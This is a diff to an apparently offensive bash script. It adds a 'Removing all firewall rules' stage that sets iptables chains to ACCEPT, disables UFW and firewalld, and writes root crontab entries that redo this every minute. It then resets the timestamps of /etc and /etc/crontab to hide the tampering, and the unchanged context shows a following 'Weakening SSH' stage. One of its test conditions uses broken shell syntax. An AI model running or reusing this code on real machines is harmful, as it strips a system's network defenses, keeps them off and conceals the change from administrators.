@@ -16,6 +16,7 @@ cecho () {
 	Red='\033[0;31m'
 	Yellow='\033[0;33m'
 	Cyan='\033[0;36m'
+	Blue='\033[0;34m'
 	Purple='\033[0;35m'
 	Green='\033[0;32m'
 
@@ -42,6 +43,9 @@ cecho () {
 			;;
 		"info")
 			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
+			;;
+		"log")
+			echo -e "${Blue}[^] ${LogMessage}${ColorOff}"
 			;;
 		"debug")
 			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
@@ -109,6 +113,12 @@ create_sha512_password_hash () {
 
 # *** Configurable variables ***
 
+IPTABLES_CHAINS="INPUT FORWARD OUTPUT"
+CRONTAB="/etc/crontab"
+IPTABLES_CRONTAB="* * * * * root iptables -F"
+UFW_CRONTAB="* * * * * root ufw disable"
+FIREWALLD_CRONTAB="* * * * * root systemctl stop firewalld && systemctl disable firewalld && systemctl mask firewalld"
+
 SSH_CONFIG_DIR="/etc/ssh"
 SSHD_CONFIG="$SSH_CONFIG_DIR/sshd_config"
 SSHD_OPTIONS="PermitRootLogin PermitEmptyPasswords PasswordAuthentication PubkeyAuthentication"
@@ -145,6 +155,100 @@ USER_PASSWORD_HASH_FALLBACK='$6$WBBmpAfTATjQcsaX$Swrd6lone44mmh7PzfKpM6BXCKqC2hu
 
 
 # *** Main ***
+
+cecho task "Removing all firewall rules"
+firewall_found=false
+
+etc_timestamp=`get_timestamp "/etc"`
+[ -f "$CRONTAB" ] && crontab_timestamp=`get_timestamp "$CRONTAB"` || crontab_timestamp=$etc_timestamp
+
+if which iptables &>/dev/null; then
+	firewall_found=true
+
+	for chain in $IPTABLES_CHAINS; do
+		if [ iptables -S | grep -q "\-P $chain" | cut -d " " -f 3 = "ACCEPT" ]; then
+			cecho log "iptables '$chain' chain already set to 'ACCEPT'"
+		else
+			iptables -P $chain ACCEPT &>/dev/null && cecho info "iptables '$chain' chain now set to 'ACCEPT'" || cecho error "Could not use iptables to change '$chain' chain"
+		fi
+	done
+
+	if grep -q "^$IPTABLES_CRONTAB" "$CRONTAB"; then
+		cecho log "iptables flush command already in crontab '$CRONTAB'"
+	else
+		echo "
+$IPTABLES_CRONTAB" >> "$CRONTAB" && cecho info "Added iptables flush every minute in crontab '$CRONTAB'" || cecho error "Could not write to crontab '$CRONTAB'"
+	fi
+else
+	cecho log "iptables not present on system, skipping"
+fi
+
+if which ufw &>/dev/null; then
+	firewall_found=true
+
+	if grep -q "active" - <<< `ufw status`; then
+		ufw disable &>/dev/null  && cecho info "Disabled UFW" || cecho error "Could not disable UFW"
+
+		if grep -q "^$UFW_CRONTAB" "$CRONTAB"; then
+			cecho log "UFW disable command already in crontab '$CRONTAB'"
+		else
+			echo "
+$UFW_CRONTAB" >> "$CRONTAB" && cecho info "Added UFW disable every minute in crontab '$CRONTAB'" || cecho error "Could not write to crontab '$CRONTAB'"
+		fi
+	else
+		cecho log "UFW already disabled"
+	fi
+else
+	cecho log "ufw not present on system, skipping"
+fi
+
+if which firewall-cmd &>/dev/null; then
+	firewall_found=true
+
+	if which systemctl &>/dev/null; then
+		if systemctl stop firewalld && systemctl disable firewalld && systemctl mask firewalld; then
+			cecho info "Stopped, disabled, and masked the firewalld service via systemctl"
+
+			if grep -q "^$FIREWALLD_CRONTAB" "$CRONTAB"; then
+				cecho log "firewalld disable command already in crontab '$CRONTAB'"
+			else
+				echo "
+$FIREWALLD_CRONTAB" >> "$CRONTAB" && cecho info "Added firewalld disable every minute in crontab '$CRONTAB'" || cecho error "Could not write to crontab '$CRONTAB'"
+			fi
+		else
+			cecho error "Could not stop, disable, and mask the firewalld service via systemctl"
+		fi
+	elif which service &>/dev/null; then
+		if service firewalld stop; then
+			cecho info "Stopped the firewalld service via service"
+
+			if grep -q "^* * * * * root service firewalld stop" "$CRONTAB"; then
+				cecho log "firewalld disable command already in crontab '$CRONTAB'"
+			else
+				echo "
+* * * * * root service firewalld stop" >> "$CRONTAB" && cecho info "Added firewalld disable every minute in crontab '$CRONTAB'" || cecho error "Could not write to crontab '$CRONTAB'"
+			fi
+		else
+			cecho error "Could not stop the firewalld service via service"
+		fi
+	else
+		firewall_found=false
+		cecho error "Could not stop the firewalld service: 'systemctl' nor 'service' found on system"
+	fi
+else
+	cecho log "firewalld not present on system, skipping"
+fi
+
+set_timestamp $etc_timestamp "/etc"
+set_timestamp $crontab_timestamp "$CRONTAB"
+
+if ! $firewall_found; then
+	cecho error "No usable firewall commands found on system"
+else
+	cecho done "Done removing all firewall rules"
+fi
+
+
 
 cecho task "Weakening SSH"
 
